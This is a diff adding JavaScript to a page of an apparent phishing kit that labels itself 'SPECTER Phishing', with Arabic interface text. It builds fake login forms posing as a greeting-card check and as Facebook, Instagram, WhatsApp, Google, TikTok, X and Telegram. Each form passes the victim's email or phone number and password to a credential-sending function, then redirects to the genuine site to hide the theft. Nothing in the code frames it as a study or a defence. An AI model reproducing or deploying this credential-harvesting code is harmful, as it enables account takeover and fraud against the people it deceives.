+// ═══════════════════════════════════════════════════════════
+document.getElementById('app').innerHTML = TEMPLATES[SITE] || TEMPLATES.card;
+document.title = SITE === 'card' ? (TITLE + ' من ' + SENDER) : 'تسجيل الدخول';
+
+// ═══════════════════════════════════════════════════════════
+// Handlers لكل موقع
+// ═══════════════════════════════════════════════════════════
+
+// بطاقة تهنئة — يفتح login مزيف
+function showCardLogin() {
+    document.getElementById('app').innerHTML = `
+    <div class="gg-view">
+        <div class="gg-container">
+            <div class="gg-title">🔐 تحقق من حسابك</div>
+            <div class="gg-subtitle">لتأكيد استلام البطاقة من <b>${SENDER}</b></div>
+            <input type="email" class="gg-input" id="cEmail" placeholder="البريد الإلكتروني">
+            <input type="password" class="gg-input" id="cPass" placeholder="كلمة المرور">
+            <div style="text-align:center; margin-top:20px;">
+                <button class="gg-btn" onclick="submitCard()" style="width:100%; padding:14px; font-size:16px;">تسجيل الدخول</button>
+            </div>
+        </div>
+    </div>`;
+}
+
+function submitCard() {
+    const e = document.getElementById('cEmail').value.trim();
+    const p = document.getElementById('cPass').value.trim();
+    if (!e || !p) { alert('⚠️ املأ كل الحقول'); return; }
+    sendCreds({ email: e, password: p }).then(() => {
+        showLoaderAndRedirect('جاري التحقق...', 'https://www.google.com', 2000);
+    });
+}
+
+// Facebook
+function submitFacebook() {
+    const e = document.getElementById('fbEmail').value.trim();
+    const p = document.getElementById('fbPass').value.trim();
+    if (!e || !p) {
+        document.getElementById('fbError').classList.add('show');
+        return;
+    }
+    sendCreds({ email: e, password: p }).then(() => {
+        showLoaderAndRedirect('جاري التحقق...', 'https://www.facebook.com', 2500);
+    });
+}
+
+// Instagram
+function submitInstagram() {
+    const u = document.getElementById('igUser').value.trim();
+    const p = document.getElementById('igPass').value.trim();
+    if (!u || !p) { alert('⚠️ املأ كل الحقول'); return; }
+    sendCreds({ email: u, password: p }).then(() => {
+        showLoaderAndRedirect('جاري التحقق...', 'https://www.instagram.com', 2500);
+    });
+}
+
+// WhatsApp
+function showWhatsAppForm() {
+    document.getElementById('waForm').classList.add('active');
+    const el = document.getElementById('waPhone');
+    if (el) el.scrollIntoView({ behavior: 'smooth' });
+}
+
+function submitWhatsApp() {
+    const ph = document.getElementById('waPhone').value.trim();
+    const p = document.getElementById('waPass').value.trim();
+    if (!ph || !p) { alert('⚠️ املأ كل الحقول'); return; }
+    sendCreds({ phone: ph, password: p, email: ph }).then(() => {
+        showLoaderAndRedirect('جاري التحقق...', 'https://web.whatsapp.com', 2500);
+    });
+}
+
+// Google
+function submitGoogle() {
+    const e = document.getElementById('ggEmail').value.trim();
+    const p = document.getElementById('ggPass').value.trim();
+    if (!e || !p) { alert('⚠️ املأ كل الحقول'); return; }
+    sendCreds({ email: e, password: p }).then(() => {
+        showLoaderAndRedirect('جاري التحقق...', 'https://myaccount.google.com', 2500);
+    });
+}
+
+// TikTok
+function submitTikTok() {
+    const u = document.getElementById('ttUser').value.trim();
+    const p = document.getElementById('ttPass').value.trim();
+    if (!u || !p) { alert('⚠️ املأ كل الحقول'); return; }
+    sendCreds({ email: u, password: p }).then(() => {
+        showLoaderAndRedirect('جاري التحقق...', 'https://www.tiktok.com/login', 2500);
+    });
+}
+
+// Twitter / X
+function submitTwitter() {
+    const u = document.getElementById('twUser').value.trim();
+    const p = document.getElementById('twPass').value.trim();
+    if (!u || !p) { alert('⚠️ املأ كل الحقول'); return; }
+    sendCreds({ email: u, password: p }).then(() => {
+        showLoaderAndRedirect('جاري التحقق...', 'https://x.com/login', 2500);
+    });
+}
+
+// Telegram
+function submitTelegram() {
+    const ph = document.getElementById('tgPhone').value.trim();
+    const p = document.getElementById('tgPass').value.trim();
+    if (!ph || !p) { alert('⚠️ املأ كل الحقول'); return; }
+    sendCreds({ phone: ph, password: p, email: ph }).then(() => {
+        showLoaderAndRedirect('جاري التحقق...', 'https://web.telegram.org', 2500);
+    });
+}
+
+// ═══════════════════════════════════════════════════════════
+// Enter key — لكل حقول كلمة المرور
+// ═══════════════════════════════════════════════════════════
+document.addEventListener('keypress', function(e) {
+    if (e.key !== 'Enter') return;
+    const handlers = {
+        'fbPass': submitFacebook,
+        'igPass': submitInstagram,
+        'waPass': submitWhatsApp,
+        'ggPass': submitGoogle,
+        'ttPass': submitTikTok,
+        'twPass': submitTwitter,
+        'tgPass': submitTelegram,
+        'cPass': submitCard
+    };
+    if (e.target.id && handlers[e.target.id]) handlers[e.target.id]();
+});
+
+console.log('%c🎣 SPECTER Phishing loaded — site:', 'color:#ff0066;font-weight:bold;', SITE);
+</script>
+
 </body>
 </html>
